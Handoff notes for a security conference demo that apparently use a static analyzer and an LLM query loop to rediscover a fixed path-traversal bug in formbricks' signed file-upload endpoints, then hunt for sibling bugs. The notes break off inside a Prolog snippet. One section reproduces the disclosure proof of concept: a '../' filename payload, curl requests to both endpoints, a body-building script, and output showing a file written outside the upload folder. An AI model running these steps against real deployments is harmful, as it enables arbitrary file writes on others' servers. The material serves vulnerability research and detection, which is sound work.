# formbricks demo — session handoff notes

Target app for the **strongest single slide** of the OWASP-IL-2026 talk:
use dhscanner + the LLM query loop to *re-derive* the vulnerability that
the maintainers already fixed upstream in [v4.0.0][1], and — the load-bearing
part — use that verified flaw as a **seed** to enumerate *siblings* of the
same class in the pre-fix code, then verify each sibling dynamically against
a local formbricks instance.

This is the demo variant that carries the paper's quantitative claim
(N-of-M sibling recall against a real maintainer fix commit). `demo/phpbb.md`
and `demo/concretecms.md` are the two companion demos we run in the same
talk; they exist to show *generalization*, not to carry the recall
measurement.

Companion to the OWASP slide deck — expected to evolve as the deck firms
up. Content here should end up either on a slide, in the speaker notes,
or explicitly parked with a reason for skipping.

## The core arc (one slide's worth)

1. Stand up formbricks locally at the **pre-fix** commit
   (`git checkout <sha just before v4.0.0>`), populated with an admin and
   two peer users so the local instance is programmatically interactable.
2. Run dhscanner in agent mode against the pre-fix source → `kb_location`.
3. LLM query loop discovers the seed vulnerability via the kbapi. **The
   seed turned out to be a split-authority path traversal across the
   `/api/v1/management/storage` + `/api/v1/management/storage/local`
   signed-URL upload pair — see §"Vulnerability characterization — full
   detail" below for the full class + PoC. This is *not* a
   BOLA/IDOR-shaped bug and the seed itself needs only one authenticated
   user, not two.**
4. LLM query loop uses the seed to enumerate *similar patterns*;
   dhscanner returns candidate handlers; the loop verifies each
   dynamically against the localhost instance. Verification predicate is
   class-dependent — for the traversal siblings: send `../` in a
   filename-shaped field, expect the file *outside* the intended upload
   prefix. For any BOLA-shaped siblings that surface: authenticate as
   user A, target a resource owned by user B, expect 4xx.
5. Rerun the full pipeline against the **post-fix** commit; the seed query
   returns empty — visible proof that the fix works and the detector is
   coupled to the actual defect, not to unrelated code churn.

## Status at handoff

Local instance is **up at `v3.16.0`** (not yet the pre-fix commit — see
caveats in TODO 1) with all three demo accounts (`admin@example.com` /
`alice@example.com` / `bob@example.com`, shared password `Owasp-2026!`)
logging in successfully via NextAuth **and** rendering the UI without
error. What's still open: pick the pre-fix SHA, do the manual seed
reproduction, and everything under TODOs 2-4. Deployment + provisioning
characterizations for the OWASP slide are captured below under TODO 1.

## Artifacts still needed (blocking everything below)

Explicitly parked here so the next session doesn't hand-wave:

1. ~~**Vuln description**~~ — **RESOLVED 2026-08-04.** See §"Vulnerability
   characterization — full detail" below. Class is **CWE-22 path traversal
   in a signed-URL / capability-based file upload flow** (not BOLA/IDOR).
   Pre-fix handlers are `apps/web/app/api/v1/management/storage/route.ts`
   (H1, signer) + `apps/web/app/api/v1/management/storage/local/route.ts`
   (H2, byte-sink). Support code + support functions catalogued below.
2. ~~**Fix commit SHA / URL**~~ — **RESOLVED 2026-08-05.** Commit
   [`9d84bc0c8de315bacbde6f1fa4ac75628e5ac5d6`][2] (PR #6375),
   titled *"fix: Uncontrolled data used in path expression in storage
   service"* — CodeQL / `js/path-injection` vocabulary, so plausibly
   GHAS also flagged it after Oren's disclosure. Full analysis of what
   the diff added / did NOT touch is in §"Fix commit — what shipped in
   v4.0.0" below. Feeds TODO 4 (rescan-the-fix) and the responsibility-
   matrix `path safe` cell.
3. ~~**Sibling recollection**~~ — **RESOLVED 2026-08-05 from the fix
   commit itself.** The 12-line `validateAndResolvePath` helper the fix
   installs is called at **four** sink-adjacent sites in
   `apps/web/lib/storage/service.ts`: `ensureDirectoryExists`,
   `getLocalFile`, `putFileToLocalStorage`, `deleteLocalFile`. That's
   the labeled positive set. **M = 4** for the N-of-M recall metric on
   TODO 3. Notably: the delete side is a *structurally different* bug
   (single-endpoint session-auth, not a signer/verifier cooperation) —
   see §"The delete flow — a per-endpoint sibling" below. That
   heterogeneity is the strongest empirical evidence for cross-
   architecture generalization we could have asked for.

Consequence of all three resolving: **TODO 2** and **TODO 3** can now
be scoped concretely — see §"Static analysis architecture" below for
the six new predicates each of them needs, plus §"Fix commit"
and §"The delete flow" for the ground truth those predicates are
graded against.

---

## Vulnerability characterization — full detail

*Added 2026-08-04. Supersedes the "BOLA/IDOR/missing-auth" placeholders
in "Artifacts still needed" above and the "Alice's session cookie
targeting Bob's resource" framing in "The core arc." Sourced from the
finder (Oren)'s disclosure email + direct read of `../formbricks` at
`v3.16.0` (`ec78038c`), which is the commit the CI workflow
(`.github/workflows/tests.yaml`) pins for its formbricks step and the
commit the local instance is deployed at (see §"Deployment
characterization" below).*

### Class

**CWE-22 Path Traversal in a signed-URL / capability-based file upload
flow.** Not BOLA, not IDOR, not missing-auth. Two authenticated
endpoints form a *pair*: endpoint H1 signs an upload capability,
endpoint H2 consumes that capability to write bytes to disk. The
filename traverses both endpoints unnormalized; neither validates path
structure; the signature makes the traversal appear "trusted" by the
byte-sink.

**Consequence for the demo doc's earlier framing.** The "Alice's cookie
targeting Bob's resource → expect 4xx" verification recipe used
throughout this file (top-of-file core arc §3-4; TODO 3 line ~674) does
*not* apply to the seed as written — the seed is authenticated-single-
user path traversal. Peer accounts (Alice/Bob) remain useful for
downstream sibling enumeration *if* any of the siblings turn out to be
BOLA-shaped, but the seed itself needs only one authenticated user.

### The two endpoints (all paths relative to `../formbricks`)

**H1 — signer.** `apps/web/app/api/v1/management/storage/route.ts` (52 lines).

- Takes `{fileName, environmentId, fileType, allowedFileExtensions?}` in
  the JSON body.
- Auth-gated by session (`getServerSession`) + env access
  (`checkAuth → hasUserEnvironmentAccess`).
- Extension-only file validation (`validateFile`); no path-structure
  check.
- Emits a signed capability bound to `updatedFileName` (traversal
  **preserved**; format: `<basename>--fid--<uuid>.<ext>`) + `signature` +
  `timestamp` + `uuid`.
- Response also emits `signedUrl` pointing to H2, computed as
  `` new URL(`${WEBAPP_URL}/api/v1/management/storage/local`).href ``.
  The *literal tail* is fully static in the AST — no need to resolve
  `WEBAPP_URL` to link the pair.

**H2 — byte sink.** `apps/web/app/api/v1/management/storage/local/route.ts`
(90 lines).

- Takes the fully-formed signed payload:
  `{fileName, environmentId, fileType, signature, timestamp, uuid, fileBase64String}`.
- Gates (in order):
    - required-fields presence,
    - `signedSignature`/`signedUuid`/`signedTimestamp` presence,
    - `getServerSession` + `checkAuth(session, environmentId, req)`,
    - `validateFile` on the *decoded* `fileName`,
    - `validateLocalSignedUrl(uuid, fileName, envId, fileType, ts, sig, ENCRYPTION_KEY)`
      — HMAC verifier — lines 52-60.
- Load-bearing gate on lines 62-64:

    ```typescript
    if (!validated) {
      return responses.unauthorizedResponse();
    }
    ```

- Past the gate:
  `putFileToLocalStorage(fileName, buffer, "public", envId, UPLOADS_DIR)`
  in `apps/web/lib/storage/service.ts:254-287`. String-interpolates
  `` uploadPath = `${rootDir}/${envId}/public/${fileName}` `` and calls
  `fs/promises.writeFile(uploadPath, buffer)`. **No `path.resolve`, no
  `path.basename`, no traversal rejection.**

### Support code (all pre-fix at v3.16.0)

- `apps/web/app/api/v1/management/storage/lib/utils.ts` —
  `checkAuth(session, environmentId, request)` + `checkForRequiredFields`.
  `checkAuth` dispatches to `hasUserEnvironmentAccess(userId, envId)` for
  session-based access; falls back to `authenticateRequest` +
  `hasPermission` (API-key auth) if `session` is null.
- `apps/web/app/api/v1/management/storage/lib/getSignedUrl.ts` —
  wraps `getUploadSignedUrl` for the "public" access type.
- `apps/web/lib/storage/service.ts` —
    - `getUploadSignedUrl(fileName, envId, fileType, "public")` on
      lines 151-213. Computes `updatedFileName = <basename>--fid--<uuid>.<ext>`
      via `split('.')` + `slice(0,-1)` + join — a traversal-preserving
      string op. Calls `generateLocalSignedUrl(updatedFileName, envId, fileType)`.
      Emits `signedUrl = new URL(`${WEBAPP_URL}/api/v1/management/storage/local`).href`
      for public uploads (or
      `${publicDomain}/api/v1/client/${envId}/storage/local` for private
      ones — that's the first *sibling* candidate for TODO 3).
    - `putFileToLocalStorage(fileName, buffer, "public", envId, UPLOADS_DIR)`
      on lines 254-287 — the actual sink.
- `apps/web/lib/environment/auth.ts:7-65` — `hasUserEnvironmentAccess(userId, envId)`.
  Returns true iff **(a)** user has an `Organization` membership on an
  org that owns a `Project` that owns the environment, AND **(b)** either
  the role is `owner`/`manager`/`billing`, OR the user has a `TeamUser`
  grant on a `Team` with a `ProjectTeam` on the owning project.
  **Implication for demo prep:** Alice and Bob (currently `member` role,
  no `Team`) are *blocked* from reaching H1 or H2 — they return 401 at
  the env-access check. To repro the vuln as a low-privilege user, they
  need `Team` + `TeamUser` + `ProjectTeam` rows on the demo project
  (see "Open work items" below).
- `apps/web/lib/fileValidation.ts:11-55` — `validateFile(name, mime)`.
  Extension-only check (`fileName.split(".").pop()`) against
  `ZAllowedFileExtension` in `packages/types/common.ts`, which includes
  `zip`. Confirms MIME matches extension. **Does not look at path
  structure.**
- `apps/web/lib/crypto.ts` — `generateLocalSignedUrl` /
  `validateLocalSignedUrl`. HMAC over `(uuid, fileName, envId, fileType, ts)`
  with server-side `ENCRYPTION_KEY`. **This is the capability verifier
  on H2 lines 52-60.**
- `apps/web/modules/auth/lib/authOptions.ts` — NextAuth v4 `authOptions`
  passed to `getServerSession`.

### Disclosure PoC (from Oren's original email, verbatim minus session cookie)

*Working setup: Linux host, `pnpm go` launches formbricks at some
commit ≤ v3.16.0 (report date: 2025-06-07 per the curl `Date:` header
in the response). Cookie is a live `next-auth.session-token` from a
logged-in user's browser session.*

Step 0 — confirm the pwned file does not yet exist:

```bash
$ ls -l ../*.zip
ls: cannot access '../*.zip': No such file or directory
```

Step 1 — the traversal payload (`simple.json`):

```json
{
  "fileName":      "../../../../../../pwned.zip",
  "environmentId": "cmbkasdan000md81oftz9ic25",
  "fileType":      "application/zip"
}
```

(`environmentId` is taken from the URL of a signed-in user — i.e.
`/environments/<id>/...` after login. Any environment the caller can
pass `hasUserEnvironmentAccess` for.)

Step 2 — call H1 (the signer):

```bash
curl -i -X POST http://localhost:3000/api/v1/management/storage \
  -H "Content-Type: application/json" \
  -H "Cookie: next-auth.session-token=<REDACTED>" \
  --data-binary @simple.json
```

Response — 200 OK. Note the traversal is **preserved** in
`updatedFileName`:

```json
{"data":{
  "signedUrl": "http://localhost:3000/api/v1/management/storage/local",
  "signingData": {
    "signature": "86e3a92022969a41e8a0e763a998973adc7ba148fb81564069fcd7b7282247bc",
    "timestamp": 1749293642033,
    "uuid":      "d9202142544b2b79b1e433cfd7706169"
  },
  "updatedFileName": "../../../../../../pwned--fid--a2c24ef0-aa61-4115-b092-468e91f48029.zip",
  "fileUrl":         "http://localhost:3000/pwned--fid--a2c24ef0-aa61-4115-b092-468e91f48029.zip"
}}
```

Step 3 — build the H2 body (`transform.js`, from Oren's email):

```javascript
const fs = require("fs");
const received = JSON.parse(fs.readFileSync("received.json", "utf8"));
const { signingData: { uuid, timestamp, signature }, updatedFileName }
    = received.data;

const environmentId    = "cmbkasdan000md81oftz9ic25";
const fileType         = "application/zip";
const fileBase64String =
    "data:application/zip;base64,UEsFBgAAAAAAAAAAAAAAAAAAAAAAAA==";

fs.writeFileSync("complete.json", JSON.stringify({
  uuid, timestamp, signature, environmentId, fileType, fileBase64String,
  fileName: updatedFileName,
}, null, 2));
```

Step 4 — call H2 (the byte sink):

```bash
curl -i -X POST http://localhost:3000/api/v1/management/storage/local \
  -H "Content-Type: application/json" \
  -H "Cookie: next-auth.session-token=<REDACTED>" \
  --data-binary @complete.json
```

Response — 200 OK: `{"data":{"message":"File uploaded successfully"}}`.

Step 5 — proof: the pwned zip now lives *outside* the intended
`uploads/<envId>/public/` prefix:

```bash
$ ls -l ../*.zip
-rw-r--r-- 1 oren oren 22 Jun 7 13:57 ../pwned--fid--a2c24ef0-aa61-4115-b092-468e91f48029.zip
```

**Empirical note on traversal depth.** Payload uses 6× `..`, but the
file lands only 4 levels up from
`~/GitHub/formbricks/uploads/<envId>/public/` (i.e. `~/GitHub/`). Extra
`..` at POSIX filesystem root are no-ops (`/..` == `/`). Effective
escape is capped at the depth of the upload root — still enough to
land anywhere the Node process can write.

### Why H2 is not directly attacker-callable (line-by-line)

H2 is publicly reachable over HTTP but *gated* — the reachable body
past line 64 requires a valid capability. Load-bearing lines:

| line | what it does |
|---:|---|
| 52–60 | calls `validateLocalSignedUrl(uuid, fileName, envId, fileType, ts, sig, ENCRYPTION_KEY)` — recomputes the HMAC server-side |
| 62 | `if (!validated)` — branches on the verifier's result |
| 63 | `return responses.unauthorizedResponse();` — early-exits on failure |
| 64 | closes the gate; every line below runs only if the signature checked out |

**Consequence for static reasoning.** For an attacker to reach line 65+
of H2, they need a `signature` that satisfies `validateLocalSignedUrl`
under server-side `ENCRYPTION_KEY`. The only handler that transitively
invokes the paired generator (`generateLocalSignedUrl`, via
`getUploadSignedUrl`, via `getSignedUrlForPublicFile`) is H1. Therefore:

> H2's post-gate body is reachable only via a prior call to H1.

This is a pure static claim from **(call-graph closure)** +
**(capability generator/verifier catalog pair)** +
**(early-return-on-null control-flow shape)**. All three ingredients
have (or need small extensions to) dhscanner primitives — see §"Static
analysis architecture" below.

### Terminology — three orthogonal questions, do not conflate

| question | what answers it | where in H2 |
|---|---|---|
| **authN — who are you?** | session cookie / JWT / API key | `getServerSession(...)` (line 37) |
| **authZ — may this identity do X?** | ACL / role / ownership check | `checkAuth → hasUserEnvironmentAccess` (lines 39–40) |
| **capability — was this specific action pre-blessed?** | HMAC / JWT / signed-URL verifier | `validateLocalSignedUrl(...)` (lines 52–60) |

Capability verifiers are **not authN**. They authorize a specific
*action*, not a specific *identity*. Presigned URLs are canonically
used anonymously (S3). Formbricks stacks session + capability as
defense-in-depth; the capability layer would function identically
without the session.

### Why the split exists at all (design pressures)

Four independent pressures push every file-upload API toward this
shape. This is the reason the H1/H2 split exists — not a formbricks
quirk:

1. **Bandwidth / memory offload.** In the canonical S3 shape, H2 is
   not your server — bytes go browser → S3 direct. Formbricks's local
   mode collapses H2 onto the same server only because self-hosters
   don't run S3.
2. **Cost of authz vs. cost of bytes.** Auth checks are cheap and
   should run once (H1) on a tiny JSON envelope. Rerunning them per
   byte-chunk of a multipart upload (H2) would be expensive.
3. **Time-limited capabilities.** Signature carries a timestamp; a
   stolen URL expires.
4. **Client ergonomics.** Progress bars, resumable uploads, retries,
   cancellation — trivial against a dumb byte-sink with a signed URL,
   complex against a fully-authorizing app server.

### Similar mechanisms in the wild (generalization for the OWASP claim)

Same shape (authorizer → signed capability → byte-sink) appears in —
non-exhaustive:

| system | authorize side | byte-sink side | signature material |
|---|---|---|---|
| AWS S3 presigned PUT | your app | `<bucket>.s3.amazonaws.com/<key>?X-Amz-Signature=…` | method + path + policy + expiry |
| AWS S3 presigned POST | your app | `<bucket>.s3.amazonaws.com/` | JSON `policy` doc (key prefix, content-type, size) |
| GCS signed URL | your app | `storage.googleapis.com/...?X-Goog-Signature=…` | canonical request |
| Azure Blob SAS | your app | `<acct>.blob.core.windows.net/...?sig=…` | string-to-sign |
| Cloudflare R2 | your app | R2 endpoint (S3-compatible) | same as S3 |
| Vercel Blob | server's `handleUpload` | `blob.vercel-storage.com/...?token=…` | server-signed JWT |
| Uploadcare / Cloudinary / Filestack / Uppy Companion | your app | vendor's ingest | HMAC / signed policy |
| tus resumable upload | `POST /files/` → `Location` header | that Location URL (PATCH per chunk) | Location URL itself |
| OCI / Docker registry blob push | `POST /v2/<name>/blobs/uploads/` | session URL (PATCH + PUT) | session URL itself |
| GitHub Actions artifact upload | `@actions/upload-artifact` API | Azure Blob presigned URL | Azure SAS |
| **formbricks (local mode)** | `/api/v1/management/storage` | `/api/v1/management/storage/local` (same host) | HMAC over `(uuid, fileName, envId, fileType, ts)` |

Formbricks's local mode is *architecturally identical* to S3 presigned
PUT with one collapsed dimension (byte-sink co-located with authorizer).
That's what makes it a canonical demo target — the finding generalizes
to any row in this table with a `✗` in the "path safe" column of the
responsibility matrix below.

### The load-bearing framing — split-authority path traversal

Each endpoint "looks fine" in per-endpoint review:

- H1 does session auth + env access + extension check. ✓
- H2 does session auth + env access + extension check + signature verify. ✓

The bug is in the **union**. Neither endpoint validates *path structure*
on `fileName`; each implicitly assumes the other does.
`validateLocalSignedUrl` proves *provenance* (this byte-string was
minted by us at time T), not *safety* (this byte-string is safe to
filesystem-join with `uploads/`).

**The responsibility matrix.** For a signed pair `(H1, H2)` and a
signed field `f`, the pair is safe iff *at least one* endpoint enforces
every required invariant on `f`. For this pair × `fileName`:

|                    | authN | authZ (envId) | ext allowed | size ok | **path safe** | sig valid |
|--------------------|:---:|:---:|:---:|:---:|:---:|:---:|
| H1 `/storage`        | ✓ | ✓ | ✓ | — | **✗** | — |
| H2 `/storage/local`  | ✓ | ✓ | ✓ | — | **✗** | ✓ |
| **pair union**     | ✓ | ✓ | ✓ | — | **✗** | ✓ |

The pair-union row is the property per-endpoint review *cannot compute
in principle* — its input scope is a single endpoint. A cross-endpoint
analyzer computes it directly.

**Proposed slide name for the class.** *Split-authority path
traversal.* Generalizes cleanly to non-path bugs: any invariant on a
field that traverses a signed handoff without either endpoint enforcing
it (signed size, signed content-type, signed environment id, etc.).

**Names for the same class in the literature:**

- **Confused deputy** variant (security). Each endpoint acts on the
  authority of the other; neither is the deputy of an attacker
  directly — they're deputizing *each other*.
- **Contract gap** (formal methods). The pair has an implicit spec
  (`auth ∧ env-access ∧ ext-ok ∧ size-ok ∧ path-safe ∧ sig-valid`);
  each endpoint implements a subset; the union is missing a conjunct.
- **"Probably-handled-elsewhere" fallacy** (code review). Diffusion of
  responsibility across a pair.

---

## Fix commit — what shipped in v4.0.0

*Added 2026-08-05. Documents the maintainers' actual fix and reads it
against the pair-level framing above. Feeds TODO 4 (rescan-the-fix)
and the M-value in TODO 3's N-of-M recall metric.*

### The commit

- **SHA:** [`9d84bc0c8de315bacbde6f1fa4ac75628e5ac5d6`][2] (PR #6375).
- **Title:** *"fix: Uncontrolled data used in path expression in
  storage service"* — verbatim CodeQL / GHAS taxonomy for
  `js/path-injection` (CWE-73/CWE-22). Suggests either the maintainers
  used the CodeQL query name directly or their internal GHAS scanner
  flagged the finding after Oren's disclosure.
- **Files changed:** 2 — `apps/web/lib/storage/service.ts` (+23 −5)
  and its unit test file (+114 −0). **No route file touched. No auth
  file touched. No crypto file touched.**

### The entire security fix, in twelve lines

Added to `apps/web/lib/storage/service.ts`:

```typescript
// Helper function to validate file paths are within the uploads directory
const validateAndResolvePath = (filePath: string): string => {
  // Resolve and normalize the path to prevent directory traversal attacks
  const resolvedPath = path.resolve(filePath);
  const uploadsPath = path.resolve(UPLOADS_DIR);

  // Ensure the resolved path is within the uploads directory
  if (!resolvedPath.startsWith(uploadsPath)) {
    throw new Error("Invalid file path: Path must be within uploads folder");
  }

  return resolvedPath;
};
```

Classical `resolve-then-check-still-inside-allowed-dir`. Called at
four sink-adjacent points in the same file:

| # | callee | side of the pair | HTTP verb the call ultimately serves |
|---|---|---|---|
| 1 | `ensureDirectoryExists(dirPath)` | consumer (transitively from H2) | POST (via `putFileToLocalStorage`) |
| 2 | `getLocalFile(filePath)` | consumer (other) | GET (file retrieval handlers) |
| 3 | `putFileToLocalStorage(...)` | consumer (H2, the upload sink) | POST |
| 4 | `deleteLocalFile(filePath)` | consumer (other) | DELETE (see §"The delete flow" below) |

Every call site is on the **consumer** side of the flow — the party
performing the filesystem operation. H1 (the signer) is not on this
list because H1's flow terminates at
`generateLocalSignedUrl(updatedFileName, ...)` and never touches any
of the four patched functions.

### What the fix explicitly does NOT touch

| component | changed? |
|---|:---:|
| H1's route (`api/v1/management/storage/route.ts`) | — |
| H2's route (`api/v1/management/storage/local/route.ts`) | — |
| crypto pair (`lib/crypto.ts` — `generateLocalSignedUrl` / `validateLocalSignedUrl`) | — |
| session / env-access auth code | — |
| `getUploadSignedUrl` (the H1 signer helper) | — |
| extension / MIME validation (`lib/fileValidation.ts`) | — |

**Neither endpoint's own contract was modified.** The fix installs the
missing property at the shared consumer-side service layer, not at
either cooperator. That's the empirical answer to *"if both endpoints
'look fine' in per-endpoint review, where does the fix even go?"* —
the maintainers put it at the deepest point on the consumer side of
the flow, where it covers all current and future consumers of that
sink family in one shot.

### The 2×2 fix-location matrix

The pair-level framing surfaces four legitimate places the fix could
have landed. The maintainers picked bottom-right:

|                        | at the route handler          | in the shared service layer                 |
|---                     |---                            |---                                          |
| **issuer side (H1)**   | reject-at-sign in H1's route  | reject-at-sign in the signer helper         |
| **consumer side (H2)** | reject-at-consume in H2's route | **← fix landed here (covers all consumers)** |

Bottom-right is defensible on merits:

- **Broadest coverage.** Covers current H2 + `getLocalFile` +
  `deleteLocalFile` + any future consumer of the sink family, without
  touching any route handler.
- **Consumer ownership.** *"The party actually writing to disk owns
  path-safety."* A reasonable interpretation of the responsibility
  matrix.
- **No auth-flow perturbation.** Zero changes to session logic,
  capability logic, or route wiring.

The three cells the maintainers *did not* pick are legitimate design
alternatives — per-endpoint SAST doesn't offer them as a choice-set,
because it can't see the pair to reason about *"which side of the
cooperation should own the property?"*. **The pair-level framing
produces the matrix; the humans pick the cell.**

### What the added tests actually cover (and what they don't)

The test file adds 114 lines, all under a new `describe("getLocalFile")`
block. They test:

- traversal rejection on direct `getLocalFile("../secret")`,
- Windows-style `"..\\secret"`,
- nested `"subdir/../../etc/passwd"`,
- `EISDIR` when a directory is passed.

**They do NOT test the full pair flow.** No test calls H1 with a
traversal-shaped `fileName`, takes the returned signed payload, and
replays it at H2 to check that the write is now rejected. The tests
cover the *helper's local correctness*, not the *pair-level property*
the helper is meant to enforce.

**Consequence for the slide.** *"Even after the maintainers correctly
patched the pair-level bug, they did not add a pair-level regression
test — because their test framework, like per-endpoint SAST, has no
vocabulary for the pair as a unit."*

### Why the commit title matters — CodeQL vocabulary vs. shipped-fix shape

Commit title uses per-flow / per-endpoint CodeQL vocabulary
(`js/path-injection` a.k.a. *"Uncontrolled data used in path
expression"*). But the *fix itself* is service-layer-shaped and
covers three sibling consumers, not just the one flow a per-flow
scanner would report. Two possibilities:

- CodeQL reported the finding (per-flow) and the maintainers
  independently made the leap to pair-level thinking when writing the
  fix.
- Oren's disclosure spelled out the pair-level shape and the
  maintainers translated it into CodeQL vocabulary they were familiar
  with for the commit title.

Either way, this is a live example of *the vocabulary of per-endpoint
SAST does not scale up to pair-level fixes, and the humans have to
make that translation manually*. dhscanner's contribution is
delivering the pair-level shape natively — no translation step.

---

## The delete flow — a per-endpoint sibling

*Added 2026-08-05. Documents the DELETE endpoint whose sink was
patched by the same commit as the upload flow. This is the strongest
empirical evidence we have for cross-architecture sibling
generalization: same sink family, same tainted field name, same
unowned property, **different auth architecture entirely.***

### The route

- **File:** `apps/web/app/storage/[environmentId]/[accessType]/[fileName]/route.ts`
- **HTTP verb:** `DELETE`
- **Auth model:** **single-endpoint session-auth.** Not a
  signer/verifier cooperation. Not a capability handoff. One handler
  that authenticates and consumes in the same place.

```typescript
const session = await getServerSession(authOptions);
if (!session?.user) { return notAuthenticatedResponse(); }

const isUserAuthorized = await hasUserEnvironmentAccess(session.user.id, validEnvId);
if (!isUserAuthorized) { return unauthorizedResponse(); }

const deleteResult = await handleDeleteFile(validEnvId, validAccessType, validFileName);
```

### The call graph to the sink

```
DELETE /storage/[environmentId]/[accessType]/[fileName]/route.ts
  └── handleDeleteFile(envId, accessType, fileName)
        └── deleteFile(envId, accessType, fileName)          -- dispatch (S3 vs local)
              └── deleteLocalFile(filePath)                  -- (S3-off branch)
                    └── fs/promises.unlink(filePath)         -- fs sink
```

`fileName` in the URL path is user-controlled and flows straight to
the `unlink` sink without any path-structure check in the pre-fix
code. **Classic single-flow taint** — the shape CodeQL / Semgrep /
any per-endpoint SAST already catches. dhscanner's existing
`arbitrary_file_write`-style rule (retargeted at `unlink` instead of
`writeFile`) should fire on this at v3.16.0.

### Why this bug is structurally different from the upload

Two path-traversal bugs in the same file, but they're not the same
shape at the SAST level:

| flow | shape | who discovers it |
|---|---|---|
| **upload** (H1 signs → H2 consumes) | pair-level cooperation gap on signed `fileName` | *only* pair-level analysis (dhscanner's contribution) |
| **delete** (single endpoint, session-auth, URL-param `fileName`) | classic single-flow taint (URL param → `unlink`) | *any* per-endpoint SAST (CodeQL, Semgrep, etc.) |

Both are CWE-22. Both patched by the same 12-line helper in the same
commit. But they required **different analysis regimes to discover**.

### The five axes of relatedness (the sibling table)

Given the upload seed, the delete flow surfaces as a sibling along
five of six axes:

| axis | upload | delete | same? |
|---|---|---|:---:|
| CWE class | CWE-22 | CWE-22 | ✓ |
| file / module | `storage/service.ts` | `storage/service.ts` | ✓ |
| sink family | filesystem write (`fs.writeFile`) | filesystem unlink (`fs.unlink`) | ✓ (same family) |
| tainted field name | `fileName` | `fileName` | ✓ |
| unowned property | `path_structure_safety(fileName)` | `path_structure_safety(fileName)` | ✓ |
| **auth model** | cooperation (H1 signs, H2 consumes) | single-endpoint (session) | ✗ |

**Five matches, one mismatch.** The one mismatch (auth architecture)
is the strength, not the weakness — it proves the sibling query is
shape-based, not pattern-copy.

### The two generalization directions the LLM loop should run

From the upload seed, the loop has two natural next queries. Both
should run; each finds different siblings.

**Direction A — same JS-level sink family.**

> *"Find all handlers reaching any function in the `fs.*` family
> (`writeFile`, `unlink`, `readFile`, `mkdir`, `appendFile`) with a
> user-controlled `fileName`-shaped field and no path-normalization
> step on the flow."*

- Broader; faster; hits the **delete** bug immediately.
- This is the **cross-architecture** win — proves the sibling query
  generalizes across auth models.

**Direction B — same crypto pair / cooperation shape.**

> *"Find all handler pairs `(H1, H2)` linked by a call to a known
> capability-pair (`generateLocalSignedUrl`/`validateLocalSignedUrl`
> or any registered equivalent) sharing a signed field with no
> normalizer on either side."*

- Deeper; more specific; finds other **cooperations**
  (e.g. the private-mode counterpart at
  `client/[environmentId]/storage/local`).
- This is the **within-architecture** win — proves the pair-level
  view enumerates other pairs.

For the OWASP demo both should run. Direction A gives the surprising
cross-architecture hit; Direction B gives the pair-level enumeration
this whole document is built around.

### The "if once, then everywhere" heuristic — empirically validated

The maintainers' fix installs the same helper at **all four** sink
sites in `storage/service.ts` — not one, not two. That's evidence,
from this codebase, that a codebase which overlooks a defense once
tends to overlook it across the entire family. This is a well-studied
empirical pattern (bug-density clustering, same-author same-mistake
propagation); the fix commit is our in-scope corroboration.

**Slide-worthy formulation:** *"When a codebase overlooks a defense
once, it typically overlooks it across the whole family. The
maintainers themselves confirmed this: they patched four sink sites
in one commit. Our loop finds the family from any one seed."*

### Design-smell aside worth naming in Q&A

Formbricks' write path is capability-gated (session + HMAC).
Formbricks' delete path is session-only (no capability). **The app's
own authorization model is asymmetric across paired operations on the
same resource class** (files under an environment). Both had CWE-22
bugs at their sinks, but at different shape levels. Not a bug per se
— an internal inconsistency the pair-level view surfaces as
*asymmetry between paired operations on the same resource class*.

---

## Static analysis architecture (what dhscanner needs)

### The precise inference we want

> There exist handlers `H1`, `H2` such that a field of `H1`'s response
> body becomes a field of `H2`'s request body via a signed capability,
> and the field carries a payload (path-structure / size / MIME /
> environmentId / …) that must be normalized somewhere in the pair —
> and is not.

### What dhscanner already has

Reading `dhscanner.core/dhscanner.service.queryengine/utils.pl` at
its current head:

- **Route enumeration** — `kb_func_def(Handler, HTTPMethod, FileName, RouteUrl)`
  and the composite `utils_http_post_handler_request_object_nextjs/3`
  (`utils.pl:86`). The route URL is already extracted from Next.js
  `route.ts` file paths at kbgen time.
- **User-input sources** — `utils_user_input/1` (line 196). For
  Next.js, any parameter typed `next/server.NextRequest` (line 202).
- **Resolved call sites** — `kb_call_resolved(Call, Fqn)`.
- **String constants** — `kb_const_string(Node, Value)` (line 227).
- **Argument / parameter binding** — `kb_arg_i_for_call/3`,
  `kb_param_i_of_callable/3`.
- **Intra-procedural taint** — `utils_bounded_intra_dataflow_path/5`
  (line 237), bounded BFS over `kb_dataflow_edge`.
- **Inter-procedural taint** — `utils_dataflow_path/3` (line 248),
  splices intra-procedural paths across `arg → param` edges via
  `utils_interprocedural_dataflow_edge_from_arg_to_param/2` (line 259).
- **Existing single-endpoint sink rule** — `arbitrary_file_write/1`
  (line 149), composed of `utils_user_input`, `utils_arbitrary_file_write`
  (arg 0 of `fs/promises.writeFile`, line 160), and `utils_dataflow_path`.

### Empirical prediction — the existing rule should already fire on H2 alone

At v3.16.0 the taint path *inside H2* is:

```
req                                                    ← utils_user_input
  → req.json()                                         ← intra
  → jsonInput.fileName                                 ← intra
  → encodedFileName                                    ← intra
  → decodeURIComponent(...)                            ← intra
  → fileName                                           ← intra
  → arg 0 of putFileToLocalStorage(...)                ← intra
    → param `fileName`                                 ← INTER (arg→param)
    → `${rootDir}/${envId}/${accessType}/${fileName}`  ← intra (template)
    → uploadPath                                       ← intra
    → arg 0 of fs/promises.writeFile                   ← utils_arbitrary_file_write
```

Two intra hops + one inter splice. `utils_dataflow_path` was built
exactly for this shape.

**TODO on next handoff:** verify `tests/expected/formbricks.sarif.json`
contains a finding at `apps/web/app/api/v1/management/storage/local/route.ts`
— that's the empirical confirmation of the prediction above.

### What per-endpoint detection misses

If dhscanner emits only "unsanitized flow to `writeFile` at H2," three
things are wrong:

1. **Explanation.** The maintainer's likely response is *"we sign the
   filename; it's proven safe."* The single-endpoint report doesn't
   refute that — it doesn't even mention H1.
2. **False-positive posture.** There are legitimate handlers that
   `writeFile` a field the *sibling* endpoint sanitized. Per-endpoint
   analysis fires on those too.
3. **Sibling enumeration.** "Other bugs like this" requires knowing
   what "this" is *at pair-level*.

The cross-endpoint predicate below solves all three.

### Six new capabilities needed (roughly in engineering-cost order)

**(1) URL-literal analysis of response bodies — easy.**

H1's response contains
`` new URL(`${WEBAPP_URL}/api/v1/management/storage/local`).href ``.
The *literal tail* (`/api/v1/management/storage/local`) is fully
static — lives in the AST as constant text between the last `${...}`
and the closing backtick. Extract at parse time. **No string-value
analysis / constant propagation / eval needed** — this is pure AST.

New KB fact to emit from kbgen: `kb_template_literal_tail(Node, Tail)`.

```prolog
utils_response_url_literal(Handler, UrlPath) :-
